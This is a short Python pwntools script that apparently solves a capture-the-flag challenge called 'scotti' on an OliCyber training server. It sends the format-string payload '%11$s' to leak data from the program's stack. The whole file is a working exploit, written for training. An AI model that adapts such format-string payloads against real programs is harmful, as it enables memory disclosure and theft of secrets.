#!/usr/bin/env python3

from pwn import *

elf = ELF("./scotti")

context.binary = elf


def conn():
    if args.REMOTE:
        p = remote("scotti.challs.olicyber.it", 12202)
    elif args.GDB:
        p  = gdb.debug([elf.path], ''' 
    b main
    c   ''' )
    else:
        p = process([elf.path])

    return p



def main():
    p = conn()
    
    p.sendlineafter(b'risposta? ', b"%11$s" )

    p.interactive()


if __name__ == "__main__":
    main()
